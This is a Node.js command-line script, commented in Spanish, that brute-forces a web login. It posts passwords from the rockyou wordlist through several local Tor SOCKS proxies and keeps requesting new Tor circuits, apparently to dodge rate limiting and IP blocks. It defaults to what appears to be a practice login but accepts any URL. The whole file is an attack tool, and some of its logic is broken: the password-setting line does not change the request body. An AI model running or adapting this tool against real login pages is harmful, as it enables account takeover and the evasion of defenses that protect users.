#!/usr/bin/env node



 //-------------importaciones--------------

import yargs from 'yargs'

import {hideBin} from 'yargs/helpers'

import fs from 'fs'

import { SocksProxyAgent } from 'socks-proxy-agent'

import axios from 'axios'

import net from 'net'





//-------------declaración de variables--------------------

let wordlist_de_proxies=[]

let wordlist_de_puertos=[]

let port= 9052







//subrama1: yargs:



const yarg= yargs(hideBin(process.argv))

.option("url",{demandOption:false,type:"string"}).option("n",{type:"number",demandOption:false, default:5}).

option("header",{type:"string",default:"application/json"})

.option("body",{type:"string"})

.option("method",{type:"string"})

.option("wordlist",{type:"string",default:"/usr/share/wordlists/rockyou.txt"})

.option("error",{type:"string",default:"error"}).parseSync()



let url= yarg.url || "https://login-de-pruebas-1.onrender.com/login"



let wordlist= fs.readFileSync(yarg.wordlist).toString().split("\n")



let body=JSON.parse(yarg.body)



let num_de_peticiones=0



let promesas=[]





let header=yarg.header

let contraseña_encontrada=false

let a=0



// for(let contra of wordlist){

//     if(contra==="password123"){console.log("contraseña encontrada, indice:",a)}

//     ++a

// }



//declaracion de funciones



async function worker(proxie){let i=0; 

    

    while(i<yarg.n){try{let contraseña= wordlist.shift(); Object.keys(body)[1]= contraseña

       

            axios.post(url,body,{httpAgent:proxie,httpsAgent:proxie,headers:{"Content-Type":header}})

     .then(function(data){if(data.data.includes("to many")){wordlist.unshift(contraseña)}if(!data.data.includes("to many")){++num_de_peticiones; console.log(num_de_peticiones);console.log("contraseña incorrecta:",contraseña);}; if(!data.data.includes("error")){console.log("la contraseña es:",contraseña); contraseña_encontrada=true; return}}).catch(function(error){console.log("error",error)})

       

     

    }catch(error){console.log("error:",error)}

        ++i;

    }

}



//-----------codigo-------------



while(port<=9060){

    let agent= new SocksProxyAgent(`socks5://127.0.0.1:${port}`,{keepAlive:false})

    wordlist_de_proxies.push(agent); wordlist_de_puertos.push(port)

    port=port+2}



   let ID1=  setInterval(async () => {if(contraseña_encontrada===true){clearInterval(ID1)}

        console.log("puertos:",wordlist_de_puertos.length)

    for(let puerto of wordlist_de_puertos){

        let socket = new net.Socket();

        socket.connect(puerto+1,"127.0.0.1",function(){



            socket.write('AUTHENTICATE ""\r\n');

            socket.on("data",function(data){

                let response= data.toString()

                    if (response.includes('250')) {

                        socket.write('SIGNAL NEWNYM\r\n');}

                        else{socket.destroy()}

            })

            socket.on("error",function(data){console.log(data.toString());  socket.write('QUIT\r\n'); socket.destroy()})})

    }



    }, 10000);



    

   let ID2= setInterval(async () => {if(contraseña_encontrada===true){clearInterval(ID2); process.exit()}

          for(let proxie of wordlist_de_proxies){

      promesas.push(worker(proxie))

    }



    await Promise.all(promesas); console.log("proxies:",wordlist_de_proxies.length); promesas=[]

    }, 5000);

       
